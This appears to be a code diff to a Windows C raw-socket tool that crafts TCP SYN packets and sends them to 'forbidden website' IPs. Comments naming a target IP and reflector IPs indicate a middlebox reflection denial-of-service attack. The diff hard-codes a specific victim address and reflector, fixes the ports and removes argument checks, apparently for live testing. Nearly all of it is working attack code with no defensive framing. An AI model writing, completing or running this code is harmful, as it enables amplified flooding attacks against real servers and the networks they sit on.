@@ -24,8 +24,11 @@
 */
 
 /* 全局常量定义 */
+//const char* forbidden_websites[] = {
+//    "66.254.114.79", "157.240.13.35", "66.254.114.41", "98.143.146.7"
+//};
 const char* forbidden_websites[] = {
-    "66.254.114.79", "157.240.13.35", "66.254.114.41", "98.143.146.7"
+    "124.221.52.164"
 };
 
 /* IP头结构体 */
@@ -132,7 +135,8 @@ unsigned __stdcall generate(void* params) {
     //for (int i = 0; i < gp->packets_per_thread; i++) {
     for (int i = 0; i <1; i++) {
         // 随机选择目标网站
-        const char* dst_ip = forbidden_websites[rand() % 4];
+        //const char* dst_ip = forbidden_websites[rand() % 4];
+        const char* dst_ip = forbidden_websites[0];
 
         // 构造SYN包
         IP_HEADER ip;
@@ -162,8 +166,12 @@ unsigned __stdcall generate(void* params) {
         ip.checksum = checksum((unsigned short*)&ip, sizeof(IP_HEADER));
 
         // 构造TCP SYN头部
-        tcp.src_port = htons(rand() % 49152 + 1024);
-        tcp.dst_port = htons(80);
+        //tcp.src_port = htons(rand() % 49152 + 1024);
+        //tcp.dst_port = htons(80);
+
+        tcp.src_port = htons(8080);
+        tcp.dst_port = htons(2025);
+
         tcp.seq_num = htonl(rand());
         tcp.ack_num = 0;
         tcp.data_off = (sizeof(TCP_HEADER) / 4) << 4;
@@ -231,17 +239,19 @@ unsigned __stdcall generate(void* params) {
 
 /* 主函数 */
 int main(int argc, char* argv[]) {
+    //target_ip = "115.29.243.219"  # 目标服务器的IP地址
+    //reflector_ips = ["124.221.52.164"]  # 反射器的IP地址列表
     // 检查管理员权限
     if (!IsAdmin()) {
         printf("请使用管理员权限运行！\n");
         return 1;
     }
 
-    // 参数校验
-    if (argc != 3) {
-        printf("用法: mra_win.exe <持续时间(秒)> <目标IP>\n");
-        return 1;
-    }
+    //// 参数校验
+    //if (argc != 3) {
+    //    printf("用法: mra_win.exe <持续时间(秒)> <目标IP>\n");
+    //    return 1;
+    //}
 
     // 初始化随机种子
     srand((unsigned int)time(NULL));
@@ -257,9 +267,11 @@ int main(int argc, char* argv[]) {
     //for (int i = 0; i < thread_count; i++) {
     for (int i = 0; i < 1; i++) {
         params[i].oc = 100;
-        params[i].target_ip = argv[2];
+        //params[i].target_ip = argv[2];
+        params[i].target_ip = "115.29.243.219";
         params[i].packets_per_thread = 400 / thread_count;
-        params[i].thread_id = i;
+        //params[i].thread_id = i;
+        params[i].thread_id = 8080;
         threads[i] = (HANDLE)_beginthreadex(NULL, 0, generate, &params[i], 0, NULL);
     }
 
